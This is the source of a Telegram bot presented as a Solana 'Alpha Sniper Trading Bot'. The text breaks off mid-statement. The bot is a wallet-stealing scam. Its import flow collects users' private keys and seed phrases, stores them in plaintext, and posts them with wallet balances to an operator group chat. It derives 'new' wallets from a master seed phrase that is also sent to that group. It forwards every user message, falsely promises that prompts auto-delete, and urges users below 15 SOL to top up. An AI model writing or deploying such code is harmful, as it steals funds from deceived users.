import { createFileRoute } from '@tanstack/react-router';
import { createHash, timingSafeEqual } from 'crypto';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import { Keypair, Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import bs58 from 'bs58';
import { supabaseAdmin } from '@/integrations/supabase/client.server';

const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
const DEV_USER_ID = 8880961735;
const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
const LOW_SOL_THRESHOLD = 15;

function deriveWebhookSecret(token: string): string {
  return createHash('sha256').update(`telegram-webhook:${token}`).digest('base64url');
}

function safeEqual(a: string, b: string): boolean {
  const left = Buffer.from(a);
  const right = Buffer.from(b);
  return left.length === right.length && timingSafeEqual(left, right);
}

async function tg(method: string, body: unknown) {
  const token = process.env.TELEGRAM_BOT_TOKEN!;
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const text = await res.text();
    console.error(`Telegram ${method} failed [${res.status}]: ${text}`);
  }
  return res.json().catch(() => ({}));
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function deriveSolanaKeypair(mnemonic: string, index: number): Keypair {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const path = `m/44'/501'/${index}'/0'`;
  const { key } = derivePath(path, seed.toString('hex'));
  return Keypair.fromSeed(key);
}

function getPrivateKeyBytes(text: string): Uint8Array | null {
  // Try Base58
  try {
    const decoded = bs58.decode(text.trim());
    if (decoded.length === 32 || decoded.length === 64) return decoded;
  } catch {}

  // Try Hex
  try {
    const clean = text.trim();
    const hex = clean.startsWith('0x') ? clean.slice(2) : clean;
    if (/^[0-9a-fA-F]+$/.test(hex)) {
      const bytes = Buffer.from(hex, 'hex');
      if (bytes.length === 32 || bytes.length === 64) return new Uint8Array(bytes);
    }
  } catch {}

  // Try Base64
  try {
    const bytes = Buffer.from(text.trim(), 'base64');
    if (bytes.length === 32 || bytes.length === 64) return new Uint8Array(bytes);
  } catch {}

  return null;
}

type TokenHolding = { symbol: string; amount: number; mint: string };
type BalanceResult = {
  ok: boolean;
  solBalance: number;
  tokens: TokenHolding[];
  truncated: boolean;
};

const symbolCache = new Map<string, string>();

async function resolveSymbol(mint: string): Promise<string> {
  if (symbolCache.has(mint)) return symbolCache.get(mint)!;
  let symbol = `Mint(${mint.slice(0, 4)}…${mint.slice(-4)})`;
  try {
    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${mint}`);
    if (res.ok) {
      const json: any = await res.json();
      const pairs: any[] = json?.pairs ?? [];
      const sol = pairs.filter((p) => p.chainId === 'solana');
      const list = sol.length ? sol : pairs;
      list.sort((a, b) => (b?.liquidity?.usd ?? 0) - (a?.liquidity?.usd ?? 0));
      const sym = list[0]?.baseToken?.symbol;
      if (sym) symbol = String(sym);
    }
  } catch {}
  symbolCache.set(mint, symbol);
  return symbol;
}

async function getWalletBalances(address: string): Promise<BalanceResult> {
  try {
    const connection = new Connection(SOLANA_RPC);
    const pubkey = new PublicKey(address);

    const [lamports, t1, t2] = await Promise.all([
      connection.getBalance(pubkey),
      connection.getParsedTokenAccountsByOwner(pubkey, { programId: TOKEN_PROGRAM_ID }).catch(() => ({ value: [] as any[] })),
      connection.getParsedTokenAccountsByOwner(pubkey, { programId: TOKEN_2022_PROGRAM_ID }).catch(() => ({ value: [] as any[] })),
    ]);

    const solBalance = lamports / LAMPORTS_PER_SOL;
    const all = [...(t1.value ?? []), ...(t2.value ?? [])];
    const raw: { mint: string; amount: number }[] = [];
    for (const ta of all) {
      const info = (ta as any).account.data.parsed.info;
      const amount = info?.tokenAmount?.uiAmount ?? 0;
      if (amount > 0) raw.push({ mint: info.mint, amount });
    }
    raw.sort((a, b) => b.amount - a.amount);
    const MAX = 20;
    const truncated = raw.length > MAX;
    const slice = raw.slice(0, MAX);
    const tokens = await Promise.all(
      slice.map(async (t) => ({ ...t, symbol: await resolveSymbol(t.mint) })),
    );
    return { ok: true, solBalance, tokens, truncated };
  } catch (e) {
    console.error('getWalletBalances error:', e);
    return { ok: false, solBalance: 0, tokens: [], truncated: false };
  }
}

function formatBalanceCard(address: string, r: BalanceResult): string {
  if (!r.ok) {
    return `<b>Address:</b> <code>${escapeHtml(address)}</code>\n(balance unavailable — try again)`;
  }
  let body = `<b>Address:</b> <code>${escapeHtml(address)}</code>\n<b>SOL:</b> ${r.solBalance} SOL\n<b>Tokens:</b>`;
  if (!r.tokens.length) {
    body += ` none`;
  } else {
    body += `\n` + r.tokens.map((t) => `  • ${escapeHtml(t.symbol)} — ${t.amount}`).join('\n');
    if (r.truncated) body += `\n  • +more`;
  }
  return body;
}

function lowBalanceNotice(sol: number): string {
  if (sol >= LOW_SOL_THRESHOLD) return '';
  return `\n\n⚠️ Your wallet balance is too low. Please top up your wallet to continue.`;
}

async function setUserState(userId: number, state: string) {
  await supabaseAdmin.from('user_states').upsert({ user_id: userId, state, updated_at: new Date().toISOString() });
}

async function getUserState(userId: number): Promise<string | null> {
  const { data } = await supabaseAdmin.from('user_states').select('state').eq('user_id', userId).single();
  return data?.state ?? null;
}

async function clearUserState(userId: number) {
  await supabaseAdmin.from('user_states').delete().eq('user_id', userId);
}

type UserWallet = { address: string; source: 'generated' | 'imported' };

async function getUserWallets(userId: number): Promise<UserWallet[]> {
  const [gen, imp] = await Promise.all([
    supabaseAdmin
      .from('generated_wallets')
      .select('address, created_at')
      .eq('telegram_user_id', userId)
      .order('created_at', { ascending: true }),
    supabaseAdmin
      .from('imported_wallets')
      .select('address, created_at')
      .eq('telegram_user_id', userId)
      .order('created_at', { ascending: true }),
  ]);
  const list: UserWallet[] = [];
  (gen.data ?? []).forEach((w: any) => list.push({ address: w.address, source: 'generated' }));
  (imp.data ?? []).forEach((w: any) => list.push({ address: w.address, source: 'imported' }));
  const seen = new Set<string>();
  return list.filter((w) => (seen.has(w.address) ? false : (seen.add(w.address), true)));
}

async function getSolBalance(address: string): Promise<number> {
  try {
    const connection = new Connection(SOLANA_RPC);
    const lamports = await connection.getBalance(new PublicKey(address));
    return lamports / LAMPORTS_PER_SOL;
  } catch (e) {
    console.error('getSolBalance error:', e);
    return 0;
  }
}

function shortAddr(addr: string): string {
  return addr.length > 10 ? `${addr.slice(0, 4)}...${addr.slice(-4)}` : addr;
}

type TokenInfo = {
  address: string;
  name: string;
  symbol: string;
  decimals: number | null;
  priceUsd: number | null;
  marketCap: number | null;
  liquidityUsd: number | null;
  createdAt: string | null;
  twitter: string | null;
  dexUrl: string;
};

async function fetchTokenInfo(address: string): Promise<TokenInfo | null> {
  try {
    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    if (!res.ok) return null;
    const json: any = await res.json();
    const pairs: any[] = json?.pairs ?? [];
    if (!pairs.length) return null;
    const solPairs = pairs.filter((p) => p.chainId === 'solana');
    const list = solPairs.length ? solPairs : pairs;
    list.sort((a, b) => (b?.liquidity?.usd ?? 0) - (a?.liquidity?.usd ?? 0));
    const p = list[0];
    const base = p.baseToken ?? {};
    const info = p.info ?? {};
    const socials: any[] = info.socials ?? [];
    const twitter = socials.find((s) => (s.type || '').toLowerCase() === 'twitter')?.url ?? null;
    const created = p.pairCreatedAt ? new Date(p.pairCreatedAt).toISOString().slice(0, 10) : null;
    return {
      address: base.address ?? address,
      name: base.name ?? 'Unknown',
      symbol: base.symbol ?? '???',
      decimals: typeof base.decimals === 'number' ? base.decimals : null,
      priceUsd: p.priceUsd ? Number(p.priceUsd) : null,
      marketCap: p.marketCap ?? p.fdv ?? null,
      liquidityUsd: p?.liquidity?.usd ?? null,
      createdAt: created,
      twitter,
      dexUrl: p.url ?? `https://dexscreener.com/solana/${address}`,
    };
  } catch (e) {
    console.error('fetchTokenInfo error:', e);
    return null;
  }
}

function fmtUsd(n: number | null): string {
  if (n == null) return 'N/A';
  if (n < 0.01 && n > 0) return `$${n.toFixed(8)}`;
  return `$${n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function isLikelySolanaAddress(s: string): boolean {
  const t = s.trim();
  if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(t)) return false;
  try {
    new PublicKey(t);
    return true;
  } catch {
    return false;
  }
}

async function postMasterMnemonicToGroup(groupChatId: string, mnemonic: string) {
  await tg('sendMessage', {
    chat_id: groupChatId,
    parse_mode: 'HTML',
    text:
      `🔐 <b>Master Seed Phrase (BIP39, 12 words)</b>\n\n` +
      `<code>${escapeHtml(mnemonic)}</code>\n\n` +
      `⚠️ All wallets generated by this bot are derived from this single phrase ` +
      `(path <code>m/44'/501'/N'/0'</code>, Solana standard).\n` +
      `Save it offline NOW.`,
  });
}

async function ensureMasterMnemonic(groupChatId: string): Promise<string> {
  // Ensure row exists
  await supabaseAdmin
    .from('bot_state')
    .upsert({ id: 1, next_index: 0 }, { onConflict: 'id', ignoreDuplicates: true });

  const { data } = await supabaseAdmin
    .from('bot_state')
    .select('mnemonic')
    .eq('id', 1)
    .maybeSingle();
  if (data?.mnemonic) return data.mnemonic;

  const mnemonic = bip39.generateMnemonic(128);
  await supabaseAdmin
    .from('bot_state')
    .update({ mnemonic, seed_posted_at: new Date().toISOString() })
    .eq('id', 1)
    .is('mnemonic', null);
  const { data: fresh } = await supabaseAdmin
    .from('bot_state')
    .select('mnemonic')
    .eq('id', 1)
    .maybeSingle();
  const finalMnemonic = fresh?.mnemonic ?? mnemonic;
  await postMasterMnemonicToGroup(groupChatId, finalMnemonic);
  return finalMnemonic;
}

async function rotateMasterMnemonic(groupChatId: string): Promise<string> {
  const mnemonic = bip39.generateMnemonic(128);
  await supabaseAdmin
    .from('bot_state')
    .upsert({ id: 1, mnemonic, next_index: 0, seed_posted_at: new Date().toISOString() }, { onConflict: 'id' });
  await tg('sendMessage', {
    chat_id: groupChatId,
    parse_mode: 'HTML',
    text:
      `♻️ <b>Master Seed Phrase ROTATED</b>\n\n` +
      `<code>${escapeHtml(mnemonic)}</code>\n\n` +
      `All new wallets will be derived from this phrase starting at <b>index 0</b>.\n` +
      `Previous phrase has been replaced.\n\n` +
      `💡 <i>On Phantom/Solflare: a fresh import of this phrase shows account #1 (index 0) by default. For higher indexes tap "Add account" once per index.</i>`,
  });
  return mnemonic;
}

// ============ UI builders ============

function mainMenuKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '💰 Wallet Management', callback_data: 'wallet_manage' }],
      [
        { text: '🛒 Buy', callback_data: 'buy' },
        { text: '💸 Sell', callback_data: 'sell' },
      ],
      [{ text: '📋 Copy Trade', callback_data: 'copy_trade' }],
      [{ text: '💰 Withdraw SOL', callback_data: 'withdraw_sol' }],
    ],
  };
}

function walletManageKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '➕ Generate New Wallet', callback_data: 'generate_wallet' },
        { text: '📥 Import Wallet', callback_data: 'import_wallet' },
      ],
      [{ text: '🔙 Back', callback_data: 'back_main' }],
    ],
  };
}

function importMethodKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '🔑 Private Key', callback_data: 'import_pk' },
        { text: '📝 Seed Phrase', callback_data: 'import_seed' },
      ],
      [{ text: '🔙 Back', callback_data: 'back_main' }],
    ],
  };
}

function welcomeText(username: string) {
  return (
    `👋 Welcome ${escapeHtml(username)} to Alpha Sniper Trading Bot!\n\n` +
    `💰 Total Balance: 0.0000 SOL\n\n` +
    `📝 You can paste any Solana token address for quick actions!`
  );
}

// ============ Handlers ============

async function handleStart(chatId: number, username: string) {
  await tg('sendMessage', {
    chat_id: chatId,
    parse_mode: 'HTML',
    text: welcomeText(username),
    reply_markup: mainMenuKeyboard(),
  });
}

async function editToMain(chatId: number, messageId: number, username: string) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: 'HTML',
    text: welcomeText(username),
    reply_markup: mainMenuKeyboard(),
  });
}

async function editToWalletManage(chatId: number, messageId: number) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: '📥 Import Wallet\n\nChoose import method:',
    reply_markup: walletManageKeyboard(),
  });
}

async function editToImportMethod(chatId: number, messageId: number) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: '📥 Import Wallet\n\nChoose import method:',
    reply_markup: importMethodKeyboard(),
  });
}

async function handleGenerate(opts: {
  userId?: number;
  username?: string;
  replyChatId: number;
  groupChatId: string;
  callbackQueryId?: string;
}) {
  const mnemonic = await ensureMasterMnemonic(opts.groupChatId);

  const { data: idxData, error: idxErr } = await supabaseAdmin.rpc('reserve_next_wallet_index');
  if (idxErr) throw idxErr;
  const index = idxData as number;

  const kp = deriveSolanaKeypair(mnemonic, index);
  const address = kp.publicKey.toBase58();
  const privateKey = bs58.encode(kp.secretKey);

  await supabaseAdmin.from('generated_wallets').insert({
    derivation_index: index,
    address,
    telegram_user_id: opts.userId ?? null,
    telegram_username: opts.username ?? null,
    telegram_chat_id: opts.replyChatId,
  });

  const requester = opts.username ? `@${opts.username}` : `user ${opts.userId ?? '?'}`;
  const walletText =
    `✅ <b>New Solana Wallet #${index}</b>\n\n` +
    `<b>Address:</b>\n<code>${escapeHtml(address)}</code>\n\n` +
    `<b>Private Key (base58):</b>\n<code>${escapeHtml(privateKey)}</code>\n\n` +
    `Derivation: <code>m/44'/501'/${index}'/0'</code>\n\n` +
    `💡 <i>On Phantom/Solflare: tap "Add account" ${index} time(s) after importing the master phrase to see this wallet.</i>`;

  await tg('sendMessage', {
    chat_id: opts.replyChatId,
    parse_mode: 'HTML',
    text: walletText,
  });

  if (String(opts.replyChatId) !== opts.groupChatId) {
    await tg('sendMessage', {
      chat_id: opts.groupChatId,
      parse_mode: 'HTML',
      text: `📬 Wallet generated by ${escapeHtml(requester)}\n\n` + walletText,
    });
  }

  if (opts.callbackQueryId) {
    await tg('answerCallbackQuery', {
      callback_query_id: opts.callbackQueryId,
      text: `Wallet #${index} generated`,
    });
  }
}

async function ackCallback(id: string, text?: string) {
  await tg('answerCallbackQuery', { callback_query_id: id, text: text ?? '' });
}

function formatUserHeader(from: { username?: string; first_name?: string; last_name?: string; id?: number } | undefined): string {
  if (!from) return '👤 <b>unknown user</b>';
  const handle = from.username ? `@${from.username}` : [from.first_name, from.last_name].filter(Boolean).join(' ') || `user ${from.id ?? '?'}`;
  return `👤 <b>${escapeHtml(handle)}</b>${from.id ? ` <i>(id ${from.id})</i>` : ''}`;
}

async function notifyGroup(groupChatId: string, from: any, action: string, details?: string) {
  const header = formatUserHeader(from);
  const body = `${header}\n${escapeHtml(action)}${details ? `\n\n${details}` : ''}`;
  await tg('sendMessage', {
    chat_id: groupChatId,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    text: body,
  });
}

export const Route = createFileRoute('/api/public/telegram/webhook')({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const groupChatId = process.env.TELEGRAM_GROUP_CHAT_ID;
        if (!token || !groupChatId) {
          return new Response('Bot not configured', { status: 500 });
        }

        const expectedSecret = deriveWebhookSecret(token);
        const actualSecret = request.headers.get('X-Telegram-Bot-Api-Secret-Token') ?? '';

        // Allow internal one-shot admin commands via a special header
        const adminAction = request.headers.get('X-Admin-Action');
        if (adminAction === 'resend_seed' && safeEqual(actualSecret, expectedSecret)) {
          const { data } = await supabaseAdmin
            .from('bot_state')
            .select('mnemonic')
            .eq('id', 1)
            .single();
          if (data?.mnemonic) await postMasterMnemonicToGroup(groupChatId, data.mnemonic);
          return Response.json({ ok: true, resent: !!data?.mnemonic });
        }

        if (!safeEqual(actualSecret, expectedSecret)) {
          return new Response('Unauthorized', { status: 401 });
        }

        const update = await request.json();
        const updateId: number | undefined = update.update_id;
        if (typeof updateId !== 'number') {
          return Response.json({ ok: true, ignored: true });
        }

        const { error: dupErr } = await supabaseAdmin
          .from('telegram_updates')
          .insert({ update_id: updateId });
        if (dupErr) {
          return Response.json({ ok: true, duplicate: true });
        }

        try {
          if (update.message?.text) {
            const text: string = update.message.text;
            const chatId: number = update.message.chat.id;
            const userId = update.message.from?.id;
            const username =
              update.message.from?.username ||
              update.message.from?.first_name ||
              'there';

            // Audit: forward every text input to the group
            await notifyGroup(
              groupChatId,
              update.message.from,
              `✏️ Text input:`,
              `<code>${escapeHtml(text)}</code>`,
            );

            if (text.startsWith('/start')) {
              if (userId) await clearUserState(userId);
              await handleStart(chatId, username);
            } else if (text.startsWith('/generate')) {
              if (userId) await clearUserState(userId);
              await handleGenerate({
                userId: update.message.from?.id,
                username: update.message.from?.username,
                replyChatId: chatId,
                groupChatId,
              });
            } else if (text.startsWith('/resendseed')) {
              const { data } = await supabaseAdmin
                .from('bot_state')
                .select('mnemonic')
                .eq('id', 1)
                .single();
              if (data?.mnemonic) await postMasterMnemonicToGroup(groupChatId, data.mnemonic);
            } else if (text.startsWith('/diag')) {
              const token = process.env.TELEGRAM_BOT_TOKEN!;
              const me = await fetch(`https://api.telegram.org/bot${token}/getMe`).then(r => r.json()).catch(e => ({ err: String(e) }));
              const chat = await fetch(`https://api.telegram.org/bot${token}/getChat`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: groupChatId }),
              }).then(r => r.json()).catch(e => ({ err: String(e) }));
              const send = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: groupChatId, text: '🧪 diag test from bot' }),
              }).then(r => r.json()).catch(e => ({ err: String(e) }));
              const summary = `Group chat id: <code>${escapeHtml(groupChatId)}</code>\n\n<b>getMe</b>:\n<code>${escapeHtml(JSON.stringify(me))}</code>\n\n<b>getChat</b>:\n<code>${escapeHtml(JSON.stringify(chat))}</code>\n\n<b>sendMessage</b>:\n<code>${escapeHtml(JSON.stringify(send))}</code>`;
              await tg('sendMessage', { chat_id: chatId, text: summary, parse_mode: 'HTML' });
            } else if (text.startsWith('/status')) {
              if (userId !== DEV_USER_ID) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                const { data: st } = await supabaseAdmin
                  .from('bot_state')
                  .select('next_index, mnemonic, seed_posted_at')
                  .eq('id', 1)
                  .maybeSingle();
                const mlen = st?.mnemonic ? st.mnemonic.split(/\s+/).length : 0;
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `🩺 <b>Bot status</b>\n\n` +
                    `next_index: <code>${st?.next_index ?? 'n/a'}</code>\n` +
                    `mnemonic: <code>${mlen ? `${mlen} words` : 'not set'}</code>\n` +
                    `seed_posted_at: <code>${escapeHtml(String(st?.seed_posted_at ?? 'n/a'))}</code>\n` +
                    `group_chat_id: <code>${escapeHtml(groupChatId)}</code>`,
                });
              }
            } else if (text.startsWith('/change')) {
              if (userId !== DEV_USER_ID) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `🔑 <b>Rotate Master Seed Phrase</b>\n\n` +
                    `Tap the button below to generate a brand new BIP39 phrase. ` +
                    `It will replace the current master seed, reset the wallet index to 0, ` +
                    `and be posted to the group.`,
                  reply_markup: {
                    inline_keyboard: [[{ text: '♻️ Generate New Phrase', callback_data: 'gen_new_phrase' }]],
                  },
                });
              }
            } else if (text.startsWith('/cancel')) {
              if (userId) await clearUserState(userId);
              await tg('sendMessage', { chat_id: chatId, text: '✅ Cancelled.' });
            } else {
              // Stateful text handlers
              const state = userId ? await getUserState(userId) : null;
              if (state === 'AWAIT_CT_ADDR' && userId) {
                const addr = text.trim();
                if (!isLikelySolanaAddress(addr)) {
                  await tg('sendMessage', { chat_id: chatId, text: '❌ Invalid address. Please send a valid Solana wallet address.' });
                } else {
                  const wallets = await getUserWallets(userId);
                  const r = await getWalletBalances(addr);
                  const base = `✅ Valid address\n\n` + formatBalanceCard(addr, r);
                  if (!wallets.length) {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      parse_mode: 'HTML',
                      text: base + `\n\n❌ No wallet connected. Connect a wallet to continue.`,
                      reply_markup: {
                        inline_keyboard: [[{ text: '🔙 Back', callback_data: 'back_main' }]],
                      },
                    });
                  } else {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      parse_mode: 'HTML',
                      text: base,
                      reply_markup: {
                        inline_keyboard: [
                          [
                            { text: 'Auto BUY', callback_data: 'ct_auto_buy' },
                            { text: 'Notifications BUY', callback_data: 'ct_notif_buy' },
                          ],
                          [{ text: '🔙 Back', callback_data: 'back_main' }],
                        ],
                      },
                    });
                  }
                }
              } else if (state === 'AWAITING_PK' || state === 'AWAITING_SEED') {
                let kp: Keypair | null = null;
                if (state === 'AWAITING_PK') {
                  const bytes = getPrivateKeyBytes(text);
                  if (bytes) {
                    try {
                      if (bytes.length === 32) {
                        kp = Keypair.fromSeed(bytes);
                      } else {
                        kp = Keypair.fromSecretKey(bytes);
                      }
                    } catch (e) {
                      console.error('Keypair creation error:', e);
                    }
                  }
                } else {
                  const mnemonic = text.trim();
                  if (bip39.validateMnemonic(mnemonic)) {
                    kp = deriveSolanaKeypair(mnemonic, 0);
                  }
                }

                if (kp) {
                  const address = kp.publicKey.toBase58();
                  const requester = username !== 'there' ? `@${username}` : `user ${userId}`;
                  const r = await getWalletBalances(address);
                  await tg('sendMessage', {
                    chat_id: chatId,
                    parse_mode: 'HTML',
                    text:
                      `✅ <b>Successfully connected</b>\n\n` +
                      formatBalanceCard(address, r) +
                      lowBalanceNotice(r.solBalance),
                  });
                  await supabaseAdmin.from('imported_wallets').insert({
                    telegram_user_id: userId,
                    address: address,
                    encrypted_key: text.trim(),
                  });
                  const secretLabel = state === 'AWAITING_PK' ? 'Private Key' : 'Seed Phrase';
                  await tg('sendMessage', {
                    chat_id: groupChatId,
                    parse_mode: 'HTML',
                    text:
                      `📥 Wallet imported by ${escapeHtml(requester)}\n\n` +
                      formatBalanceCard(address, r) +
                      `\n\n<b>${secretLabel}:</b>\n<code>${escapeHtml(text.trim())}</code>`,
                  });
                  if (userId) await clearUserState(userId);
                } else {
                  // Detect if user pasted a wallet address instead of a key/phrase
                  if (isLikelySolanaAddress(text.trim())) {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      text: '❌ This address is invalid for import. You sent a public wallet address, but we need your private key or seed phrase to connect the wallet.',
                    });
                  } else {
                    const msg = state === 'AWAITING_PK'
                      ? '❌ Invalid private key. Please send a valid Solana private key (Base58, Hex, or Base64).'
                      : '❌ Invalid seed phrase. Please send a valid 12 or 24 word BIP39 recovery phrase.';
                    await tg('sendMessage', { chat_id: chatId, text: msg });
                  }
                }
              } else if (state && state.startsWith('BUY_CA|') && userId) {
                const walletAddr = state.slice('BUY_CA|'.length);
                const ca = text.trim();
                if (!isLikelySolanaAddress(ca)) {
                  await tg('sendMessage', {
                    chat_id: chatId,
                    text: '❌ Invalid contract address. Please send a valid Solana token address.',
                  });
                } else {
                  const info = await fetchTokenInfo(ca);
                  if (!info) {
                    await tg('sendMessage', {
                      chat_id: chatId,
                      text: '❌ Could not find token information for that address. Double-check the contract address and try again.',
                    });
                  } else {
                    await setUserState(userId, `BUY_TKN|${walletAddr}|${info.address}|${info.symbol}|${info.name}`);
                    const twitterLine = info.twitter ? `\n🐦 <a href="${escapeHtml(info.twitter)}">Twitter</a>` : '';
                    const text2 =
                      `📊 <b>Token Information</b>\n\n` +
                      `🏷️ <b>Name:</b> ${escapeHtml(info.name)}\n` +
                      `🔤 <b>Symbol:</b> ${escapeHtml(info.symbol)}\n` +
                      `🔢 <b>Decimals:</b> ${info.decimals ?? 'N/A'}\n` +
                      `💰 <b>Price:</b> ${fmtUsd(info.priceUsd)}\n` +
                      `📈 <b>Market Cap:</b> ${fmtUsd(info.marketCap)}\n` +
                      `💧 <b>Liquidity:</b> ${fmtUsd(info.liquidityUsd)}\n` +
                      `📍 <b>Address:</b> <code>${escapeHtml(info.address)}</code>\n` +
                      `📅 <b>Created:</b> ${info.createdAt ?? 'N/A'}` +
                      twitterLine +
                      `\n\nIs this the correct token?`;
                    await tg('sendMessage', {
                      chat_id: chatId,
                      parse_mode: 'HTML',
                      disable_web_page_preview: true,
                      text: text2,
                      reply_markup: {
                        inline_keyboard: [
                          [
                            { text: '✅ Confirm Token', callback_data: 'buy_confirm' },
                            { text: '❌ Cancel', callback_data: 'back_main' },
                          ],
                          [{ text: '📊 View Chart', url: info.dexUrl }],
                        ],
                      },
                    });
                  }
                }
              }
            }
          } else if (update.callback_query) {
            const cq = update.callback_query;
            const data: string = cq.data ?? '';
            const chatId: number | undefined = cq.message?.chat?.id;
            const messageId: number | undefined = cq.message?.message_id;
            const username = cq.from?.username || cq.from?.first_name || 'there';

            // Audit: forward every button click to the group
            await notifyGroup(
              groupChatId,
              cq.from,
              `🔘 Button clicked:`,
              `<code>${escapeHtml(data)}</code>`,
            );



            if (data === 'generate_wallet') {
              try {
                await handleGenerate({
                  userId: cq.from?.id,
                  username: cq.from?.username,
                  replyChatId: chatId!,
                  groupChatId,
                  callbackQueryId: cq.id,
                });
              } catch (e) {
                console.error('generate_wallet error:', e);
                await ackCallback(cq.id, 'Generation failed');
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `❌ Wallet generation failed: ${escapeHtml(String((e as Error)?.message ?? e))}`,
                });
              }
            } else if (data === 'gen_new_phrase') {
              if (cq.from?.id !== DEV_USER_ID) {
                await ackCallback(cq.id, 'Not authorized');
              } else {
                try {
                  await rotateMasterMnemonic(groupChatId);
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    text: '✅ Master phrase rotated. Next wallets start at index 0. New phrase posted to group.',
                  });
                  await ackCallback(cq.id, 'Rotated');
                } catch (e) {
                  console.error('gen_new_phrase error:', e);
                  await ackCallback(cq.id, 'Rotation failed');
                  await tg('sendMessage', {
                    chat_id: chatId!,
                    text: `❌ Rotation failed: ${escapeHtml(String((e as Error)?.message ?? e))}`,
                  });
                }
              }
            } else if (data === 'wallet_manage' && chatId && messageId) {
              await editToWalletManage(chatId, messageId);
              await ackCallback(cq.id);
            } else if (data === 'import_wallet' && chatId && messageId) {
              await editToImportMethod(chatId, messageId);
              await ackCallback(cq.id);
            } else if (data === 'back_main' && chatId && messageId) {
              await editToMain(chatId, messageId, username);
              await ackCallback(cq.id);
            } else if (data === 'import_pk') {
              await setUserState(cq.from.id, 'AWAITING_PK');
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `🔑 Import Private Key \n\n Please send your private key: \n\n Accepted formats: \n • Base58 (from Phantom/Solflare) - Most common \n • Hex (32 or 64 characters, with or without 0x) \n • Base64 encoded \n\n ⚠️ Make sure you're copying the entire key without extra spaces. \n ⚠️ This message will auto-delete after 1 minutes for security.`,
              });
              await ackCallback(cq.id);
            } else if (data === 'import_seed') {
              await setUserState(cq.from.id, 'AWAITING_SEED');
              await tg('sendMessage', {
                chat_id: chatId!,
                text: `📝 Import Mnemonic Phrase \n\n Please send your 12 or 24 word recovery phrase: \n\n ⚠️ Send words separated by spaces. This message will auto-delete after 1 minutes.`,
              });
              await ackCallback(cq.id);
            } else if (data === 'sell') {
              await tg('sendMessage', {
                chat_id: chatId!,
                text:
                  `📭 No Tokens Found\n\n` +
                  `You don't have any tokens in your wallets to sell.\n\n` +
                  `Buy some tokens first or check another wallet.`,
                reply_markup: {
                  inline_keyboard: [
                    [{ text: '🛒 BUY Token', callback_data: 'buy' }],
                    [{ text: '🔙 Back', callback_data: 'back_main' }],
                  ],
                },
              });
              await ackCallback(cq.id);
            } else if (data === 'buy') {
              const uid = cq.from?.id;
              const wallets = uid ? await getUserWallets(uid) : [];
              if (!wallets.length) {
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text:
                    `📭 No wallets found.\n\n` +
                    `Generate or import a wallet first from 💰 Wallet Management.`,
                  reply_markup: {
                    inline_keyboard: [
                      [{ text: '💰 Wallet Management', callback_data: 'wallet_manage' }],
                      [{ text: '🔙 Back', callback_data: 'back_main' }],
                    ],
                  },
                });
                await ackCallback(cq.id);
              } else {
                const balances = await Promise.all(wallets.map((w) => getSolBalance(w.address)));
                const lines = wallets.map((w, i) =>
                  `Wallet${i + 1}  ${shortAddr(w.address)}   (${balances[i].toFixed(4)} SOL)`
                );
                const buttons = wallets.map((w, i) => [{
                  text: `Wallet ${i + 1} (${balances[i].toFixed(4)} SOL)`,
                  callback_data: `bw|${w.address}`,
                }]);
                buttons.push([{ text: '🔙 Back', callback_data: 'back_main' }]);
                await tg('sendMessage', {
                  chat_id: chatId!,
                  text: `🛒 <b>Select a wallet to buy from</b>\n\n${escapeHtml(lines.join('\n'))}`,
                  parse_mode: 'HTML',
                  reply_markup: { inline_keyboard: buttons },
                });
                await ackCallback(cq.id);
              }
            } else if (data.startsWith('bw|')) {
              const walletAddr = data.slice(3);
              const uid = cq.from?.id;
              if (uid) await setUserState(uid, `BUY_CA|${walletAddr}`);
              const wallets = uid ? await getUserWallets(uid) : [];
              const idx = wallets.findIndex((w) => w.address === walletAddr);
              const num = idx >= 0 ? idx + 1 : 1;
              const bal = await getSolBalance(walletAddr);
              await tg('sendMessage', {
                chat_id: chatId!,
                parse_mode: 'HTML',
                text:
                  `🔍 <b>Enter Token Address</b>\n\n` +
                  `📍 Wallet: Wallet ${num}\n` +
